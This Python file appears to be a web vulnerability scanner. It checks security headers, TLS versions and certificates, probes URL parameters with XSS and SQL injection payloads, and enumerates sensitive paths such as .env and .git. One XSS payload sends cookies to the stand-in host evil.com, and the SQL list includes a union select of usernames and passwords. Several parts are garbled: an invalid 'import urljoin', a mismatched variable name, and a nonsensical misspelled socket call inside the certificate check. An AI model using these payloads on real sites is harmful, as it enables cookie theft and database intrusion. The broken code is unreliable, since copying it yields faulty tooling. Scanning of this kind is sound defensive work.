from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode
import re
import requests
import time
import random
import string
import time
import ssl
import socket
import datetime
import urljoin

def check_headers(headers):
    vulnerabilities = []

    if "Server" in headers:
        server_header = headers.get("Server", "")
        if "Apache/2.4.1" in server_header:
            vulnerabilities.append({
                "issue": "Outdated Apache server detected",
                "severity": "high",
                "description": "The server is running Apache version 2.4.1, which may have known vulnerabilities.",
                "recommendation": "Update the Apache server to the latest secure version."
            })
        elif "nginx/1.14.0" in server_header:
            vulnerabilities.append({
                "issue": "Outdated Nginx server detected",
                "severity": "high",
                "description": "The server is running an outdated version of Nginx.",
                "recommendation": "Update the Nginx server to the latest secure version."
            })
        elif server_header:
            vulnerabilities.append({
                "issue": "Server version exposed",
                "severity": "medium",
                "description": f"The server version is exposed in the headers: {server_header}",
                "recommendation": "Remove or obscure the server version header to reduce the attack surface."
            })

    if "X-Powered-By" in headers:
        vulnerabilities.append({
            "issue": "Technology exposure via X-Powered-By header",
            "severity": "medium",
            "description": "The server discloses its technology via the X-Powered-By header.",
            "recommendation": "Remove the X-Powered-By header to limit information disclosure."
        })

    SECURITY_HEADERS = {
        "Content-Security-Policy": "high",
        "X-Content-Type-Options": "medium",
        "Strict-Transport-Security": "high",
        "X-Frame-Options": "medium",
        "Referrer-Policy": "medium",
        "Permissions-Policy": "low"
    }

    for header, severity in security_headers.items():
        if header not in headers:
            vulnerabilities.append({
                "issue": f"Missing {header} header",
                "severity": severity,
                "description": f"The {header} header is not present, which can reduce security.",
                "recommendation": f"Add the {header} header to enhance security."
            })

    if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
        vulnerabilities.append({
            "issue": "Insecure CORS policy",
            "severity": "high",
            "description": "The Access-Control-Allow-Origin header allows access from any domain ('*').",
            "recommendation": "Restrict Access-Control-Allow-Origin to trusted domains only."
        })

    return vulnerabilities

def check_xss(html_content):
    vulnerabilities = []
    
    xss_patterns = [
        r"<script.*?>.*?</script>",                   # Inline <script> tags
        r"<img\s+.*?src=['\"]?javascript:",           # JavaScript in image src
        r"on\w+\s*=",                                 # Inline event handlers
        r"<iframe.*?>",                               # Inline iframes
        r"<object.*?>",                               # Inline objects
        r"style\s*=\s*['\"].*expression\(.*?\)",      # CSS expressions
        r"document\.cookie",                          # Accessing cookies
        r"window\.",                                  # Accessing window properties
        r"eval\(",                                    # JavaScript eval function
        r"javascript\s*:",                            # JavaScript URIs
        r"<.*?srcdoc=['\"].*?</.*?>",                 # Potential XSS in srcdoc attribute
        r"<svg.*?onload=",                            # SVG tag with onload
        r"document\.write\(",                         # document.write usage
        r"innerHTML\s*=",                             # Potential for DOM-based XSS
        r"<body.*?onload=",                           # body tag with onload event
        r"<input.*?onfocus=",                         # input tag with event
        r"<link.*?href=['\"]?javascript:",            # JavaScript in href of <link>
        r"\bonerror\b",                               # Inline onerror event
    ]

    for pattern in xss_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            vulnerabilities.append({
                "issue": "Potential XSS vulnerability detected",
                "severity": "high",
                "description": f"Pattern '{pattern}' suggests a possible XSS vulnerability.",
                "recommendation": "Sanitize inputs, validate all data, and apply CSP."
            })

    dom_patterns = [
        r"document\.write\(",
        r"innerHTML\s*=",
        r"eval\(", 
        r"setTimeout\(",
        r"setInterval\(",
    ]
    for pattern in dom_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            vulnerabilities.append({
                "issue": "Potential DOM-based XSS vulnerability",
                "severity": "medium",
                "description": f"Detected use of '{pattern}', which can enable DOM-based XSS.",
                "recommendation": "Avoid unsafe JavaScript methods; use safer alternatives like textContent."
            })

    return vulnerabilities

def test_reflected_xss(url):
    vulnerabilities = []
    
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><img src=x onerror=alert('XSS')>",
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
        "'';!--\"<XSS>=&{()}",
        "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<object data='javascript:alert(\"XSS\")'></object>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E",
        "<img src=noimg onerror=location.href='//evil.com/cookie=' + document.cookie>" 
    ]

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            vulnerabilities.extend(check_payload_in_response(test_url, payload))

            encoded_payload = urlencode({param: payload})
            encoded_test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_payload}"
            vulnerabilities.extend(check_payload_in_response(encoded_test_url, payload))

    return vulnerabilities

def check_payload_in_response(test_url, payload):
    vulnerabilities = []
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
        "Accept-Language": "en-US,en;q=0.5"
    }
    try:
        test_response = requests.get(test_url, headers=headers, timeout=5)
        
        if payload in test_response.text:
            vulnerabilities.append({
                "issue": "Reflected XSS vulnerability",
                "severity": "high",
                "description": f"Reflected XSS payload '{payload}' detected in response.",
                "recommendation": "Sanitize and encode all user inputs to prevent XSS."
            })
        
        encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        if encoded_payload in test_response.text:
            vulnerabilities.append({
                "issue": "Possible XSS via encoded reflection",
                "severity": "medium",
                "description": f"Encoded payload '{encoded_payload}' was reflected, indicating weak sanitization.",
                "recommendation": "Ensure all user inputs are fully sanitized and properly encoded."
            })

        partial_encoded_payload = payload.replace("<", "&lt;")
        if partial_encoded_payload in test_response.text:
            vulnerabilities.append({
                "issue": "Partial encoding detected",
                "severity": "medium",
                "description": f"Payload partially encoded as '{partial_encoded_payload}', indicating bypass potential.",
                "recommendation": "Apply full encoding or sanitization for all input values."
            })

    except requests.exceptions.RequestException as e:
        vulnerabilities.append({
            "issue": "Network error during XSS testing",
            "severity": "critical",
            "description": f"Error accessing {test_url}: {e}",
            "recommendation": "Ensure network stability and URL accessibility during testing."
        })

    return vulnerabilities

SQL_PAYLOADS = [
    "' OR '1'='1",                                # Basic always-true statement
    "' OR '1'='0",                                # Basic always-false statement
    "'; --",                                      # Comment terminator
    "' OR 1=1 --",                                # Bypassing with comment
    "' OR sleep(5) --",                           # Time-based SQL injection
    "' OR pg_sleep(5) --",                        # Time-based for PostgreSQL
    "' OR BENCHMARK(1000000,MD5(1)) --",          # Time-based for MySQL
    "' AND 1=0 UNION SELECT NULL,NULL --",        # Union injection
    "' UNION SELECT username, password FROM users --" # Union injection
]

SQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "Microsoft OLE DB Provider for SQL Server",
    "ORA-01756",  
    "PG::SyntaxError", 
    "SQLite3::SQLException" 
]

def construct_url(base_url, query_params):
    parsed_url = urlparse(base_url)
    query_string = urlencode(query_params, doseq=True)
    return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"

def generate_unique_marker():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def check_error_based_injection(test_url):
    response = requests.get(test_url)
    for error in SQL_ERRORS:
        if error in response.text:
            return {
                "issue": "SQL Injection vulnerability (Error-Based)",
                "severity": "high",
                "description": f"SQL error message detected: '{error}'",
                "recommendation": "Use prepared statements or ORM to avoid SQL injection."
            }
    return None

def check_boolean_based_injection(base_url, param, query_params, marker):
    conditions = [
        ("' AND '1'='1", "' AND '1'='0"),
        ("' OR '1'='1", "' OR '1'='0"),
        ("' AND 1=1", "' AND 1=0"),
    ]

    for true_cond, false_cond in conditions:
        true_params = query_params.copy()
        false_params = query_params.copy()
        true_params[param] = f"{true_cond} -- {marker}"
        false_params[param] = f"{false_cond} -- {marker}"

        true_url = construct_url(base_url, true_params)
        false_url = construct_url(base_url, false_params)

        response_true = requests.get(true_url)
        response_false = requests.get(false_url)

        if response_true.text != response_false.text:
            return {
                "issue": "SQL Injection vulnerability (Boolean-Based)",
                "severity": "high",
                "description": f"Boolean-based SQL injection detected using parameter '{param}' with varied conditions.",
                "recommendation": "Sanitize inputs, use prepared statements, or parameterized queries."
            }
    return None

def check_time_based_injection(base_url, param, query_params):
    time_payloads = [
        "' OR sleep(5) --",
        "' OR pg_sleep(5) --",
        "' OR IF(1=1, sleep(5), 0) --",
        "' OR BENCHMARK(1000000,MD5(1)) --"
    ]

    for payload in time_payloads:
        test_params = query_params.copy()
        test_params[param] = payload
        test_url = construct_url(base_url, test_params)

        start_time = time.time()
        response = requests.get(test_url)
        end_time = time.time()

        if end_time - start_time >= 5:
            return {
                "issue": "SQL Injection vulnerability (Time-Based)",
                "severity": "high",
                "description": f"Time-based SQL injection detected using parameter '{param}' with payload '{payload}'.",
                "recommendation": "Sanitize inputs, use prepared statements, or parameterized queries."
            }
    return None

TLS_HEADERS = {
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "SAMEORIGIN"
}

def check_tls_headers(url):
    try:
        response = requests.get(url, timeout=5)
        missing_or_incorrect_headers = []

        for header, required_value in TLS_HEADERS.items():
            actual_value = response.headers.get(header)
            if actual_value is None:
                missing_or_incorrect_headers.append({
                    "header": header,
                    "expected": required_value,
                    "found": "Not present"
                })
            elif actual_value != required_value:
                missing_or_incorrect_headers.append({
                    "header": header,
                    "expected": required_value,
                    "found": actual_value
                })

        return missing_or_incorrect_headers

    except requests.exceptions.RequestException as e:
        return [{
            "issue": "Network Error",
            "severity": "critical",
            "description": f"Unable to connect to {url}: {e}",
            "recommendation": "Ensure the server is reachable and accessible over HTTPS."
        }]

def get_certificate_info(hostname):
    context = ssl.create_default_context()
    with socket.create_connection((hostname, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()
            return cert

def is_certificate_valid(cert):
    not_before = datetime.datetime.strptime(cert['notBefore'], "%b %d %H:%M:%S %Y %Z")
    not_after = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
    current_time = datetime.datetime.utcnow()
    not_before =  socket.crearte_connection (( context.sql.strptTime, header.Missing))
    
    if not_before <= current_time <= not_after:
        return True
    else:
        return False

def check_tls_protocol_support(hostname):
    supported_protocols = []
    protocols = [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1, ssl.PROTOCOL_TLSv1_2, ssl.PROTOCOL_TLSv1_3]
    protocol_names = {ssl.PROTOCOL_TLSv1: "TLS 1.0", ssl.PROTOCOL_TLSv1_1: "TLS 1.1", ssl.PROTOCOL_TLSv1_2: "TLS 1.2", ssl.PROTOCOL_TLSv1_3: "TLS 1.3"}

    for protocol in protocols:
        context = ssl.SSLContext(protocol)
        try:
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    supported_protocols.append(protocol_names[protocol])
        except ssl.SSLError:
            continue
        except Exception as e:
            return [{
                "issue": "Network Error",
                "severity": "critical",
                "description": f"Unable to test TLS version {protocol_names[protocol]}: {e}",
                "recommendation": "Ensure server is accessible and configured for SSL connections."
            }]

    return supported_protocols

COMMON_PATHS = [
    "admin/", "backup/", "config.php", "login/", "db_backup/", 
    ".env", "uploads/", "log/", "private/", "temp/", "test/", 
    "config.json", "phpinfo.php", "web.config", ".git/", 
    ".svn/", ".htaccess", ".htpasswd", "old/", "temp/", 
    "backup/", "backups/", "bak/", "logs/", "tmp/"
]

COMMON_EXTENSIONS = ["", ".php", ".bak", ".old", ".log", ".txt", ".zip", ".tar.gz"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
]

def directory_enumeration(base_url):
    vulnerabilities = []
    
    def check_path(path):
        url = urljoin(base_url, path)
        headers = {
            "User-Agent": random.choice(USER_AGENTS)
        }
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                vulnerabilities.append({
                    "issue": "Exposed Directory or File",
                    "severity": "medium",
                    "description": f"Accessible resource found at {url}.",
                    "recommendation": "Restrict access or remove unnecessary resources."
                })
            elif response.status_code == 403:
                vulnerabilities.append({
                    "issue": "Restricted but Exposed Directory",
                    "severity": "low",
                    "description": f"Restricted directory at {url} (403 Forbidden).",
                    "recommendation": "Consider blocking access or hiding the directory."
                })
        except requests.RequestException as e:
            print(f"Error accessing {url}: {e}")

    paths_to_check = []
    for path in COMMON_PATHS:
        for ext in COMMON_EXTENSIONS:
            paths_to_check.append(path + ext)

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_path, paths_to_check)

    return vulnerabilities